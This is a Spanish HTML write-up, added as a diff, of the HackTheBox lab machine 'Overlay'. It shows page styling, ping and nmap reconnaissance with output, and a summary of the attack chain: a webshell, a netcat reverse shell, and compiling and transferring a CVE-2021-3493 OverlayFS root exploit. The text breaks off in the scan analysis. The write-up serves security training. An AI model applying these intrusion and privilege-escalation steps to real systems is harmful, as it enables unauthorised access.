@@ -1,0 +1,1383 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>Overlay — HackTheBox Writeup | Brandeiks</title>
+  <meta name="description" content="Writeup de la máquina Overlay de HackTheBox — Dificultad: Muy Fácil. WebShell → Reverse Shell → CVE-2021-3493 OverlayFS LPE.">
+  <meta name="author" content="Brandon Zevallos Pastrana">
+  <link rel="icon" type="image/svg+xml" href="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 100 100'%3E%3Crect width='100' height='100' fill='%2300ff88' rx='20'/%3E%3Ctext x='50%25' y='50%25' text-anchor='middle' dy='.35em' font-size='70' font-weight='bold' fill='%23050a0e' font-family='monospace'%3EB%3C/text%3E%3C/svg%3E">
+  <link href="https://fonts.googleapis.com/css2?family=Share+Tech+Mono&family=Rajdhani:wght@300;400;600;700&family=Orbitron:wght@400;700;900&display=swap" rel="stylesheet"/>
+  <style>
+    :root {
+      --bg:        #050a0e;
+      --bg2:       #080f14;
+      --bg3:       #0a1520;
+      --green:     #00ff88;
+      --cyan:      #00ff88;
+      --red:       #ff2d55;
+      --yellow:    #ffd700;
+      --orange:    #ff8c00;
+      --purple:    #bf5fff;
+      --dim:       #1a2a2e;
+      --text:      #c8d8e0;
+      --text-dim:  #4a6a74;
+      --font-mono: 'Share Tech Mono', monospace;
+      --font-main: 'Rajdhani', sans-serif;
+      --font-disp: 'Orbitron', sans-serif;
+    }
+    * { margin: 0; padding: 0; box-sizing: border-box; }
+    html { scroll-behavior: smooth; }
+    body {
+      background: var(--bg);
+      color: var(--text);
+      font-family: var(--font-main);
+      overflow-x: hidden;
+      cursor: none;
+    }
+    body::before {
+      content: '';
+      position: fixed; inset: 0;
+      background: repeating-linear-gradient(
+        0deg, transparent, transparent 2px,
+        rgba(0,255,136,0.012) 2px, rgba(0,255,136,0.012) 4px
+      );
+      pointer-events: none; z-index: 1000;
+    }
+
+    /* CURSOR */
+    a, button { cursor: none; }
+    .cursor {
+      position: fixed; width: 10px; height: 10px;
+      background: var(--green); border-radius: 50%;
+      pointer-events: none; z-index: 9999;
+      transform: translate(-50%,-50%);
+      box-shadow: 0 0 12px var(--green); opacity: 0;
+    }
+    .cursor-ring {
+      position: fixed; width: 36px; height: 36px;
+      border: 1px solid var(--green); border-radius: 50%;
+      pointer-events: none; z-index: 9998;
+      transform: translate(-50%,-50%); opacity: 0;
+      transition: all 0.12s ease;
+    }
+
+    /* NAV */
+    nav {
+      position: fixed; top: 0; left: 0; right: 0; z-index: 500;
+      display: flex; justify-content: space-between; align-items: center;
+      padding: 1.2rem 4rem;
+      background: rgba(5,10,14,0.92); backdrop-filter: blur(10px);
+      border-bottom: 1px solid rgba(0,255,136,0.08);
+    }
+    .nav-logo { font-family: var(--font-disp); font-size: 1rem; color: var(--green); letter-spacing: 4px; text-decoration: none; }
+    .nav-back { font-family: var(--font-mono); font-size: 0.78rem; color: var(--text-dim); text-decoration: none; letter-spacing: 2px; transition: color 0.3s; }
+    .nav-back::before { content: '← '; }
+    .nav-back:hover { color: var(--green); }
+
+    /* HERO */
+    .writeup-hero {
+      min-height: 42vh; display: flex; align-items: flex-end;
+      padding: 8rem 4rem 3rem; position: relative; overflow: hidden;
+      border-bottom: 1px solid var(--dim);
+    }
+    .hero-grid {
+      position: absolute; inset: 0;
+      background-image:
+        linear-gradient(rgba(0,255,136,0.03) 1px, transparent 1px),
+        linear-gradient(90deg, rgba(0,255,136,0.03) 1px, transparent 1px);
+      background-size: 60px 60px;
+    }
+    .hero-glow {
+      position: absolute; width: 600px; height: 400px;
+      background: radial-gradient(ellipse, rgba(0,255,136,0.07) 0%, transparent 70%);
+      top: 0; left: 0; pointer-events: none;
+    }
+    .writeup-hero-content { position: relative; z-index: 2; max-width: 900px; }
+    .breadcrumb { font-family: var(--font-mono); font-size: 0.72rem; color: var(--text-dim); letter-spacing: 2px; margin-bottom: 1.2rem; }
+    .breadcrumb a { color: var(--text-dim); text-decoration: none; transition: color 0.2s; }
+    .breadcrumb a:hover { color: var(--green); }
+    .breadcrumb span { color: var(--green); }
+    .writeup-title { font-family: var(--font-disp); font-size: clamp(2.5rem, 6vw, 4.5rem); font-weight: 900; letter-spacing: 2px; line-height: 1.1; }
+    .writeup-title span { color: var(--cyan); }
+    .writeup-subtitle { font-family: var(--font-mono); font-size: 0.85rem; color: var(--text-dim); margin-top: 0.8rem; letter-spacing: 1px; }
+    .writeup-meta { display: flex; flex-wrap: wrap; gap: 1rem; align-items: center; margin-top: 1.8rem; }
+    .meta-badge { font-family: var(--font-mono); font-size: 0.68rem; letter-spacing: 2px; padding: 0.3rem 0.8rem; border: 1px solid; }
+    .badge-vfacil  { color: #00ffcc;  border-color: rgba(0,255,204,0.4);  background: rgba(0,255,204,0.05); }
+    .badge-htb     { color: var(--green);  border-color: rgba(0,255,136,0.3);  background: rgba(0,255,136,0.05); }
+    .badge-linux   { color: var(--yellow); border-color: rgba(255,215,0,0.3);  background: rgba(255,215,0,0.05); }
+    .badge-cve     { color: var(--red);    border-color: rgba(255,45,85,0.4);   background: rgba(255,45,85,0.05); }
+    .badge-shell   { color: var(--cyan);   border-color: rgba(0,229,255,0.3);   background: rgba(0,229,255,0.05); }
+    .badge-nmap    { color: var(--orange); border-color: rgba(255,140,0,0.4);   background: rgba(255,140,0,0.05); }
+    .meta-date { font-family: var(--font-mono); font-size: 0.7rem; color: var(--text-dim); }
+
+    /* LAYOUT */
+    .writeup-layout {
+      display: grid; grid-template-columns: 1fr 240px;
+      gap: 3rem; max-width: 1300px; margin: 0 auto; padding: 4rem;
+    }
+
+    /* SIDEBAR */
+    .sidebar { position: sticky; top: 5rem; height: fit-content; order: 2; }
+    .sidebar-box { border: 1px solid var(--dim); padding: 1.5rem; background: var(--bg2); margin-bottom: 1.5rem; }
+    .sidebar-title { font-family: var(--font-mono); font-size: 0.65rem; color: var(--green); letter-spacing: 3px; margin-bottom: 1.2rem; }
+    .toc-list { list-style: none; display: flex; flex-direction: column; gap: 0.4rem; }
+    .toc-list a {
+      font-family: var(--font-mono); font-size: 0.7rem; color: var(--text-dim);
+      text-decoration: none; letter-spacing: 1px; transition: all 0.2s;
+      display: block; padding: 0.25rem 0.8rem;
+      border-left: 2px solid transparent;
+    }
+    .toc-list a:hover { color: var(--green); border-left-color: var(--green); }
+    .toc-list a.active { color: var(--green); border-left-color: var(--green); opacity: 1; }
+    .info-row { display: flex; justify-content: space-between; align-items: center; margin-bottom: 0.8rem; }
+    .info-label { font-family: var(--font-mono); font-size: 0.65rem; color: var(--text-dim); letter-spacing: 1px; }
+    .info-val { font-family: var(--font-mono); font-size: 0.72rem; }
+    .val-green  { color: var(--green); }
+    .val-cyan   { color: var(--cyan); }
+    .val-yellow { color: var(--yellow); }
+    .val-red    { color: var(--red); }
+    .val-vfacil { color: #00ffcc; }
+
+    /* ATTACK PATH */
+    .attack-path { display: flex; flex-direction: column; gap: 0; }
+    .ap-item { display: flex; align-items: flex-start; gap: 0.8rem; padding: 0.5rem 0; }
+    .ap-dot { width: 8px; height: 8px; background: var(--green); border-radius: 50%; margin-top: 4px; flex-shrink: 0; box-shadow: 0 0 6px var(--green); }
+    .ap-line { width: 1px; height: 16px; background: rgba(0,255,136,0.2); margin: 0 3.5px; }
+    .ap-text { font-family: var(--font-mono); font-size: 0.65rem; color: var(--text-dim); line-height: 1.5; }
+    .ap-text span { color: var(--cyan); }
+
+    /* CONTENT */
+    .writeup-content { min-width: 0; order: 1; }
+
+    /* PROGRESS BAR */
+    .progress-container { position: fixed; top: 0; left: 0; width: 100%; height: 3px; background: transparent; z-index: 1001; }
+    .progress-bar { height: 100%; background: var(--green); width: 0%; transition: width 0.15s ease; box-shadow: 0 0 8px var(--green); }
+
+    /* SKIP LINK */
+    .skip-link { position: absolute; top: -40px; left: 0; background: var(--green); color: var(--bg); padding: 8px 16px; z-index: 10000; text-decoration: none; font-family: var(--font-mono); font-size: 0.8rem; transition: top 0.2s; }
+    .skip-link:focus { top: 0; }
+
+    /* COPY BUTTON */
+    .copy-btn {
+      position: absolute; top: 0.5rem; right: 4.5rem;
+      background: var(--dim); border: 1px solid rgba(0,255,136,0.3);
+      color: var(--text-dim); font-family: var(--font-mono);
+      font-size: 0.62rem; padding: 0.15rem 0.5rem; letter-spacing: 1px;
+      cursor: none; opacity: 0; transition: opacity 0.2s, background 0.2s, color 0.2s;
+      z-index: 10; white-space: nowrap;
+    }
+    .cmd-block:hover .copy-btn { opacity: 1; }
+    .copy-btn:hover { background: var(--green); color: var(--bg); border-color: var(--green); }
+    .copy-btn.copied { background: var(--green); color: var(--bg); border-color: var(--green); opacity: 1; }
+
+    /* TOAST */
+    .toast {
+      position: fixed; bottom: 24px; right: 24px;
+      background: var(--green); color: #000;
+      padding: 0.7rem 1.4rem; font-family: var(--font-mono);
+      font-size: 0.75rem; letter-spacing: 2px; font-weight: 600;
+      opacity: 0; transform: translateY(8px);
+      transition: opacity 0.25s, transform 0.25s;
+      pointer-events: none; z-index: 10000;
+    }
+    .toast.show { opacity: 1; transform: translateY(0); }
+
+    /* SECTIONS */
+    .section { margin-bottom: 4rem; opacity: 0; transform: translateY(20px); transition: opacity 0.5s ease, transform 0.5s ease; }
+    .section.visible { opacity: 1; transform: translateY(0); }
+    .section-label { font-family: var(--font-mono); font-size: 0.68rem; color: var(--green); letter-spacing: 4px; margin-bottom: 0.5rem; }
+    .section-title { font-family: var(--font-disp); font-size: 1.5rem; font-weight: 700; letter-spacing: 2px; margin-bottom: 0.6rem; }
+    .section-line { width: 40px; height: 2px; background: var(--green); margin-bottom: 2rem; }
+
+    /* PROSE */
+    .prose p { font-size: 1.05rem; line-height: 1.9; color: var(--text-dim); margin-bottom: 1rem; }
+    .prose p strong { color: var(--text); }
+    .prose p .hl       { color: var(--green); font-weight: bold; }
+    .prose p .hl-cyan  { color: var(--cyan); }
+    .prose p .hl-red   { color: var(--red); }
+    .prose p .hl-yel   { color: var(--yellow); }
+    .prose p .hl-pur   { color: var(--purple); }
+
+    /* STEP */
+    .step-marker { display: flex; align-items: center; gap: 1rem; margin-bottom: 1.2rem; margin-top: 2.5rem; }
+    .step-num { font-family: var(--font-disp); font-size: 0.65rem; color: var(--bg); background: var(--green); width: 26px; height: 26px; display: flex; align-items: center; justify-content: center; flex-shrink: 0; font-weight: 900; }
+    .step-title { font-family: var(--font-mono); font-size: 0.8rem; color: var(--green); letter-spacing: 2px; }
+
+    /* CMD BLOCK */
+    .cmd-block {
+      background: var(--bg3); border: 1px solid rgba(0,229,255,0.15);
+      border-left: 3px solid var(--cyan); padding: 1rem 1.2rem;
+      margin: 1rem 0; font-family: var(--font-mono); font-size: 0.82rem;
+      overflow-x: auto; position: relative; line-height: 1.8;
+    }
+    .cmd-block .cmd-label { position: absolute; top: 0.5rem; right: 0.8rem; font-size: 0.6rem; color: var(--text-dim); letter-spacing: 2px; }
+    .cmd-block .prompt { color: var(--green); user-select: none; }
+    .cmd-block .prompt-root { color: var(--red); user-select: none; }
+    .cmd-block .cmd    { color: var(--text); }
+    .cmd-block .flag   { color: var(--cyan); }
+    .cmd-block .arg    { color: var(--yellow); }
+    .cmd-block .comment { color: var(--text-dim); font-size: 0.75rem; }
+
+    /* OUTPUT */
+    .output-block {
+      background: #020608; border: 1px solid var(--dim);
+      padding: 1rem 1.2rem; margin: 0.5rem 0 1.5rem;
+      font-family: var(--font-mono); font-size: 0.77rem;
+      line-height: 1.9; color: var(--text-dim); overflow-x: auto;
+    }
+    .output-block .o-green  { color: var(--green); }
+    .output-block .o-cyan   { color: var(--cyan); }
+    .output-block .o-red    { color: var(--red); }
+    .output-block .o-yellow { color: var(--yellow); }
+    .output-block .o-white  { color: var(--text); }
+    .output-block .o-purple { color: var(--purple); }
+
+    /* INFO BOX */
+    .info-box { border: 1px solid rgba(0,229,255,0.2); background: rgba(0,229,255,0.04); padding: 1.2rem 1.5rem; margin: 1.2rem 0; }
+    .info-box-title { font-family: var(--font-mono); font-size: 0.65rem; color: var(--cyan); letter-spacing: 3px; margin-bottom: 0.6rem; }
+    .info-box p { font-family: var(--font-mono); font-size: 0.78rem; color: var(--text-dim); line-height: 1.7; }
+    .info-box p strong { color: var(--cyan); }
+
+    .warn-box { border: 1px solid rgba(255,140,0,0.25); background: rgba(255,140,0,0.04); padding: 1.2rem 1.5rem; margin: 1.2rem 0; }
+    .warn-box-title { font-family: var(--font-mono); font-size: 0.65rem; color: var(--orange); letter-spacing: 3px; margin-bottom: 0.6rem; }
+    .warn-box p { font-family: var(--font-mono); font-size: 0.78rem; color: var(--text-dim); line-height: 1.7; }
+    .warn-box p strong { color: var(--orange); }
+
+    .cve-box { border: 1px solid rgba(255,45,85,0.3); background: rgba(255,45,85,0.04); padding: 1.2rem 1.5rem; margin: 1.2rem 0; }
+    .cve-box-title { font-family: var(--font-mono); font-size: 0.65rem; color: var(--red); letter-spacing: 3px; margin-bottom: 0.6rem; }
+    .cve-box p { font-family: var(--font-mono); font-size: 0.78rem; color: var(--text-dim); line-height: 1.7; }
+    .cve-box p strong { color: var(--red); }
+
+    /* CRED BOX */
+    .cred-box { border: 1px solid rgba(0,255,136,0.25); background: rgba(0,255,136,0.04); padding: 1.2rem 1.5rem; margin: 1.2rem 0; display: flex; gap: 2rem; flex-wrap: wrap; }
+    .cred-item .cred-label { font-family: var(--font-mono); font-size: 0.6rem; color: var(--text-dim); letter-spacing: 2px; margin-bottom: 0.3rem; }
+    .cred-item .cred-val   { font-family: var(--font-mono); font-size: 0.95rem; color: var(--green); }
+
+    /* VULN TABLE */
+    .vuln-table { width: 100%; border-collapse: collapse; margin: 1.5rem 0; }
+    .vuln-table th, .vuln-table td { font-family: var(--font-mono); font-size: 0.72rem; padding: 0.8rem 1rem; text-align: left; border-bottom: 1px solid var(--dim); }
+    .vuln-table th { color: var(--cyan); letter-spacing: 2px; border-bottom-color: rgba(0,229,255,0.2); }
+    .vuln-table td { color: var(--text-dim); }
+    .vuln-table td:first-child { color: var(--green); }
+
+    /* DIVIDER */
+    hr.divider { border: none; height: 1px; background: linear-gradient(90deg, rgba(0,255,136,0.3), transparent); margin: 3rem 0; }
+
+    /* CMD REF SECTION */
+    .cmd-ref-grid { display: grid; grid-template-columns: 1fr 1fr; gap: 1.2rem; margin-top: 1.5rem; }
+    .cmd-ref-card { border: 1px solid var(--dim); background: var(--bg2); padding: 1.5rem; transition: border-color 0.3s; }
+    .cmd-ref-card:hover { border-color: rgba(0,229,255,0.25); }
+    .cmd-ref-name { font-family: var(--font-mono); font-size: 0.9rem; color: var(--cyan); margin-bottom: 0.5rem; letter-spacing: 1px; }
+    .cmd-ref-syntax { font-family: var(--font-mono); font-size: 0.72rem; color: var(--green); background: var(--bg3); padding: 0.4rem 0.7rem; margin-bottom: 0.8rem; display: inline-block; }
+    .cmd-ref-desc { font-size: 0.92rem; color: var(--text-dim); line-height: 1.7; margin-bottom: 0.8rem; }
+    .cmd-ref-flags { list-style: none; display: flex; flex-direction: column; gap: 0.3rem; }
+    .cmd-ref-flags li { font-family: var(--font-mono); font-size: 0.7rem; color: var(--text-dim); }
+    .cmd-ref-flags li span { color: var(--yellow); }
+
+    /* GLOSARIO */
+    .glosario-grid { display: grid; grid-template-columns: 1fr; gap: 1rem; margin-top: 1.5rem; }
+    .glos-card { border: 1px solid var(--dim); background: var(--bg2); padding: 1.4rem 1.5rem; transition: border-color 0.3s; }
+    .glos-card:hover { border-color: rgba(0,229,255,0.2); }
+    .glos-term { font-family: var(--font-mono); font-size: 0.88rem; color: var(--cyan); margin-bottom: 0.4rem; letter-spacing: 1px; }
+    .glos-def { font-size: 0.95rem; color: var(--text-dim); line-height: 1.75; }
+    .glos-def strong { color: var(--green); }
+    .glos-def code { color: var(--yellow); font-family: var(--font-mono); font-size: 0.85em; }
+
+    /* FOOTER */
+    footer { padding: 2rem 4rem; border-top: 1px solid var(--dim); display: flex; justify-content: space-between; align-items: center; margin-top: 4rem; }
+    footer p { font-family: var(--font-mono); font-size: 0.7rem; color: var(--text-dim); letter-spacing: 1px; }
+    footer span { color: var(--green); }
+
+    @media (max-width: 960px) {
+      nav, .writeup-hero, footer { padding-left: 1.5rem; padding-right: 1.5rem; }
+      .writeup-layout { grid-template-columns: 1fr; padding: 2rem 1.5rem; }
+      .sidebar { position: static; }
+      .cmd-ref-grid { grid-template-columns: 1fr; }
+      body, a, button { cursor: auto; }
+      .cursor, .cursor-ring { display: none; }
+    }
+  </style>
+</head>
+<body>
+
+<a href="#main-content" class="skip-link">Saltar al contenido principal</a>
+<div class="progress-container"><div class="progress-bar" id="readingProgress"></div></div>
+<div class="cursor" id="cursor"></div>
+<div class="cursor-ring" id="cursorRing"></div>
+
+<nav>
+  <a href="../../index.html" class="nav-logo">BRANDEIKS_SEC</a>
+  <a href="../../index.html" class="nav-back">volver al portafolio</a>
+</nav>
+
+<!-- HERO -->
+<div class="writeup-hero">
+  <div class="hero-grid"></div>
+  <div class="hero-glow"></div>
+  <div class="writeup-hero-content">
+    <p class="breadcrumb">
+      <a href="../../index.html">brandeiks</a> /
+      <a href="../">writeups</a> /
+      <a href="../../writeups/hackthebox/">hackthebox</a> /
+      <span>overlay</span>
+    </p>
+    <h1 class="writeup-title"><span>Overlay</span></h1>
+    <p class="writeup-subtitle">HackTheBox — Linux · WebShell RCE → Reverse Shell → CVE-2021-3493 OverlayFS LPE</p>
+    <div class="writeup-meta">
+      <span class="meta-badge badge-vfacil">● MUY FÁCIL</span>
+      <span class="meta-badge badge-htb">HACKTHEBOX</span>
+      <span class="meta-badge badge-linux">LINUX</span>
+      <span class="meta-badge badge-cve">CVE-2021-3493</span>
+      <span class="meta-badge badge-shell">REVERSE SHELL</span>
+      <span class="meta-badge badge-nmap">NMAP</span>
+      <span class="meta-date">📅 Mayo 2026 · By Brandeiks</span>
+    </div>
+  </div>
+</div>
+
+<!-- LAYOUT -->
+<div class="writeup-layout">
+
+  <!-- SIDEBAR -->
+  <aside class="sidebar">
+    <div class="sidebar-box">
+      <p class="sidebar-title">// ÍNDICE</p>
+      <ul class="toc-list">
+        <li><a href="#resumen">01 · Resumen</a></li>
+        <li><a href="#reconocimiento">02 · Reconocimiento</a></li>
+        <li><a href="#webshell">03 · Webshell &amp; Enum</a></li>
+        <li><a href="#revshell">04 · Reverse Shell</a></li>
+        <li><a href="#cve">05 · CVE-2021-3493</a></li>
+        <li><a href="#exploit">06 · Compilar &amp; Transferir</a></li>
+        <li><a href="#privesc">07 · Escalada a Root</a></li>
+        <li><a href="#flags">08 · Flags</a></li>
+        <li><a href="#referencia">09 · Referencia de Comandos</a></li>
+        <li><a href="#glosario">10 · Glosario</a></li>
+      </ul>
+    </div>
+    <div class="sidebar-box">
+      <p class="sidebar-title">// INFO</p>
+      <div class="info-row"><span class="info-label">Plataforma</span><span class="info-val val-green">HackTheBox</span></div>
+      <div class="info-row"><span class="info-label">OS</span><span class="info-val val-yellow">Linux (Ubuntu 20.04)</span></div>
+      <div class="info-row"><span class="info-label">Dificultad</span><span class="info-val val-vfacil">Muy Fácil</span></div>
+      <div class="info-row"><span class="info-label">IP Target</span><span class="info-val" style="color:var(--text)">10.129.5.243</span></div>
+      <div class="info-row"><span class="info-label">CVE</span><span class="info-val val-red">CVE-2021-3493</span></div>
+      <div class="info-row"><span class="info-label">Estado</span><span class="info-val val-green">● Pwned</span></div>
+    </div>
+    <div class="sidebar-box">
+      <p class="sidebar-title">// ATTACK PATH</p>
+      <div class="attack-path">
+        <div class="ap-item"><div class="ap-dot"></div><div class="ap-text"><span>Nmap</span> → puertos 22, 80</div></div>
+        <div class="ap-line"></div>
+        <div class="ap-item"><div class="ap-dot"></div><div class="ap-text"><span>WebShell HTTP:80</span> → RCE como www-data</div></div>
+        <div class="ap-line"></div>
+        <div class="ap-item"><div class="ap-dot"></div><div class="ap-text"><span>whoami / uname -a</span> → info del sistema</div></div>
+        <div class="ap-line"></div>
+        <div class="ap-item"><div class="ap-dot"></div><div class="ap-text"><span>nc + bash</span> → reverse shell</div></div>
+        <div class="ap-line"></div>
+        <div class="ap-item"><div class="ap-dot"></div><div class="ap-text"><span>user.txt</span> → flag de usuario</div></div>
+        <div class="ap-line"></div>
+        <div class="ap-item"><div class="ap-dot"></div><div class="ap-text"><span>CVE-2021-3493</span> → kernel 5.8.0-48</div></div>
+        <div class="ap-line"></div>
+        <div class="ap-item"><div class="ap-dot"></div><div class="ap-text"><span>gcc -static</span> → exploit compilado</div></div>
+        <div class="ap-line"></div>
+        <div class="ap-item"><div class="ap-dot"></div><div class="ap-text"><span>python3 http.server</span> → transferencia</div></div>
+        <div class="ap-line"></div>
+        <div class="ap-item"><div class="ap-dot" style="background:var(--red);box-shadow:0 0 6px var(--red)"></div><div class="ap-text"><span style="color:var(--red)">./exploit-static</span> → ROOT</div></div>
+      </div>
+    </div>
+  </aside>
+
+  <!-- CONTENT -->
+  <main class="writeup-content" id="main-content">
+
+    <!-- RESUMEN -->
+    <div class="section" id="resumen">
+      <p class="section-label">// 01</p>
+      <h2 class="section-title">Resumen</h2>
+      <div class="section-line"></div>
+      <div class="prose">
+        <p>
+          <strong>Overlay</strong> es una máquina de dificultad <span class="hl">muy fácil</span>
+          de la plataforma <span class="hl-cyan">HackTheBox</span>, diseñada para introducir el
+          concepto de <strong>explotación de vulnerabilidades del kernel de Linux</strong>. Corre sobre
+          <strong>Ubuntu 20.04 LTS</strong> con kernel <span class="hl">5.8.0-48-generic</span>, y
+          expone dos servicios: <span class="hl-cyan">SSH (puerto 22)</span> y un servidor web
+          <span class="hl-cyan">HTTP (puerto 80)</span> con Apache 2.4.41.
+        </p>
+        <p>
+          Lo que hace especial a esta máquina es que el puerto 80 ya tiene una
+          <strong>WebShell preinstalada</strong> — una interfaz web que permite ejecutar comandos
+          directamente en el servidor como el usuario <span class="hl">www-data</span>. Esto simula
+          un escenario donde una aplicación web ya comprometida sirve de punto de entrada.
+          Desde ahí se obtiene la <span class="hl">user flag</span> y se establece una
+          <strong>reverse shell</strong> estable mediante Netcat.
+        </p>
+        <p>
+          La escalada de privilegios aprovecha que el kernel instalado es vulnerable a
+          <span class="hl-red">CVE-2021-3493</span>, una vulnerabilidad de <strong>OverlayFS Local
+          Privilege Escalation</strong> que permite a cualquier usuario sin privilegios obtener una
+          shell como <span class="hl-red">root</span> mediante la combinación de namespaces de usuario
+          no privilegiados y montajes overlay sin restricciones.
+        </p>
+      </div>
+
+      <table class="vuln-table">
+        <thead>
+          <tr><th>Fase</th><th>Técnica / Herramienta</th><th>Resultado</th></tr>
+        </thead>
+        <tbody>
+          <tr><td>Reconocimiento</td><td>ping -c 3</td><td>Host activo — TTL=63 (Linux)</td></tr>
+          <tr><td>Escaneo</td><td>nmap -p- -sSCV --min-rate=5000 -oX</td><td>Puertos 22 (SSH) y 80 (HTTP) abiertos</td></tr>
+          <tr><td>Reporte</td><td>xsltproc overlay.xml</td><td>Reporte HTML visual del scan Nmap</td></tr>
+          <tr><td>Enum. Web</td><td>WebShell en puerto 80</td><td>RCE como www-data</td></tr>
+          <tr><td>Info del sistema</td><td>whoami / uname -a / cat user.txt</td><td>Kernel 5.8.0-48 + user flag</td></tr>
+          <tr><td>Acceso inicial</td><td>nc -lvnp 443 + bash reverse shell</td><td>Shell interactiva como www-data</td></tr>
+          <tr><td>Investigación</td><td>CVE-2021-3493 (briskets/github)</td><td>Exploit OverlayFS para Ubuntu 20.04</td></tr>
+          <tr><td>Compilación</td><td>gcc -static exploit.c -o exploit-static</td><td>Binario estático listo</td></tr>
+          <tr><td>Transferencia</td><td>python3 -m http.server 8000 + wget</td><td>exploit-static en la víctima</td></tr>
+          <tr><td>Privesc</td><td>chmod +x + ./exploit-static</td><td>Shell como root</td></tr>
+          <tr><td>Post-explot.</td><td>cat /root/root.txt</td><td>Root flag obtenida</td></tr>
+        </tbody>
+      </table>
+    </div>
+
+    <hr class="divider">
+
+    <!-- RECONOCIMIENTO -->
+    <div class="section" id="reconocimiento">
+      <p class="section-label">// 02</p>
+      <h2 class="section-title">Reconocimiento</h2>
+      <div class="section-line"></div>
+
+      <div class="step-marker">
+        <div class="step-num">1</div>
+        <span class="step-title">VERIFICACIÓN DE CONECTIVIDAD — PING</span>
+      </div>
+      <div class="prose">
+        <p>
+          Antes de lanzar cualquier herramienta, siempre se verifica que la máquina objetivo está
+          activa y alcanzable. El comando <span class="hl-cyan">ping</span> envía paquetes
+          <strong>ICMP echo-request</strong> y espera una respuesta <strong>echo-reply</strong>.
+          La flag <span class="hl-cyan">-c 3</span> limita el envío a exactamente 3 paquetes,
+          evitando un ping infinito. Si el host responde, la red está correctamente configurada
+          y podemos continuar.
+        </p>
+        <p>
+          Un dato importante: el valor de <strong>TTL (Time To Live)</strong> en la respuesta
+          es <span class="hl">63</span>. Los sistemas Linux típicamente tienen TTL de 64, y el
+          valor llega reducido en 1 por cada salto de red que atraviesa. TTL=63 indica
+          <strong>un salto de distancia</strong> — confirma que el objetivo es Linux, dato útil
+          antes incluso de usar Nmap.
+        </p>
+      </div>
+
+      <div class="cmd-block" data-cmd="ping 10.129.5.243 -c 3">
+        <button class="copy-btn" onclick="copyCmd(this)">COPY</button>
+        <span class="cmd-label">PING</span>
+        <div><span class="prompt">$ </span><span class="cmd">ping <span class="arg">10.129.5.243</span> <span class="flag">-c 3</span></span></div>
+      </div>
+
+      <div class="output-block">
+        <div>PING 10.129.5.243 (10.129.5.243) 56(84) bytes of data.</div>
+        <div><span class="o-green">64 bytes from 10.129.5.243: icmp_seq=1 ttl=63 time=457 ms</span></div>
+        <div><span class="o-green">64 bytes from 10.129.5.243: icmp_seq=2 ttl=63 time=760 ms</span></div>
+        <div><span class="o-green">64 bytes from 10.129.5.243: icmp_seq=3 ttl=63 time=137 ms</span></div>
+        <div>&nbsp;</div>
+        <div>--- 10.129.5.243 ping statistics ---</div>
+        <div>3 packets transmitted, 3 received, <span class="o-green">0% packet loss</span>, time 2003ms</div>
+        <div>rtt min/avg/max/mdev = 137.471/451.582/759.963/254.163 ms</div>
+      </div>
+
+      <div class="info-box">
+        <p class="info-box-title">// ¿POR QUÉ TTL=63 Y NO 64?</p>
+        <p>El TTL se decrementa en 1 por cada router (salto) que atraviesa el paquete. Linux usa TTL inicial de <strong>64</strong>. Al llegar a nuestro equipo con TTL=63, significa que pasó por <strong>1 router</strong> (el gateway de HackTheBox). Si fuera Windows, el TTL inicial sería 128 y llegaría como 127.</p>
+      </div>
+
+      <div class="step-marker">
+        <div class="step-num">2</div>
+        <span class="step-title">ESCANEO DE PUERTOS CON NMAP</span>
+      </div>
+      <div class="prose">
+        <p>
+          Con la conectividad confirmada, se realiza un escaneo completo de todos los
+          <strong>65,535 puertos TCP</strong> usando Nmap. Cada flag tiene un propósito específico:
+          <span class="hl-cyan">-p-</span> escanea todos los puertos (no solo los 1000 más comunes),
+          <span class="hl-cyan">-sSCV</span> combina tres modos: SYN scan sigiloso, detección de versión
+          de servicios y ejecución de scripts de reconocimiento.
+          <span class="hl-cyan">-n</span> desactiva la resolución DNS para acelerar el scan,
+          <span class="hl-cyan">-Pn</span> omite el host discovery (asume que el host está activo),
+          y <span class="hl-cyan">--min-rate=5000</span> fuerza un mínimo de 5000 paquetes por segundo
+          para que el scan sea rápido. El resultado se guarda en formato XML con
+          <span class="hl-cyan">-oX overlay.xml</span> para procesarlo después.
+        </p>
+      </div>
+
+      <div class="cmd-block" data-cmd="sudo nmap -p- -sSCV -n -Pn --min-rate=5000 --open 10.129.5.243 -oX overlay.xml">
+        <button class="copy-btn" onclick="copyCmd(this)">COPY</button>
+        <span class="cmd-label">NMAP</span>
+        <div><span class="prompt">$ </span><span class="cmd">sudo nmap <span class="flag">-p- -sSCV -n -Pn</span> <span class="flag">--min-rate=5000 --open</span> <span class="arg">10.129.5.243</span> <span class="flag">-oX</span> <span class="arg">overlay.xml</span></span></div>
+      </div>
+
+      <div class="output-block">
+        <div>Starting Nmap 7.99 ( https://nmap.org ) at 2026-05-18 11:25 -0400</div>
+        <div>Nmap scan report for 10.129.5.243</div>
+        <div><span class="o-green">Host is up</span> (2.7s latency).</div>
+        <div>Not shown: 33910 filtered tcp ports (no-response), 31623 closed tcp ports (reset)</div>
+        <div class="o-white">PORT&nbsp;&nbsp;&nbsp; STATE SERVICE VERSION</div>
+        <div><span class="o-cyan">22/tcp  open  ssh</span>&nbsp;&nbsp;&nbsp; OpenSSH 8.2p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)</div>
+        <div>| ssh-hostkey:</div>
+        <div>|&nbsp;&nbsp; 3072 22:62:af:ab:89:83:6e:85:ca:57:22:0d:3d:40:c2:13 (RSA)</div>
+        <div>|&nbsp;&nbsp; 256 9b:12:f5:aa:07:f7:20:2f:e5:17:81:be:53:de:b4:6b (ECDSA)</div>
+        <div>|_  256 8c:03:d9:3d:26:b3:07:1e:94:78:d8:03:e0:c0:a6:2c (ED25519)</div>
+        <div><span class="o-cyan">80/tcp  open  http</span>&nbsp;&nbsp; Apache httpd 2.4.41 ((Ubuntu))</div>
+        <div>|_http-server-header: Apache/2.4.41 (Ubuntu)</div>
+        <div><span class="o-yellow">|_http-title: HackTheBox WebShell</span></div>
+        <div>Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel</div>
+        <div>&nbsp;</div>
+        <div>Nmap done: 1 IP address (1 host up) scanned in 47.79 seconds</div>
+      </div>
+
+      <div class="info-box">
+        <p class="info-box-title">// ANÁLISIS DEL SCAN</p>
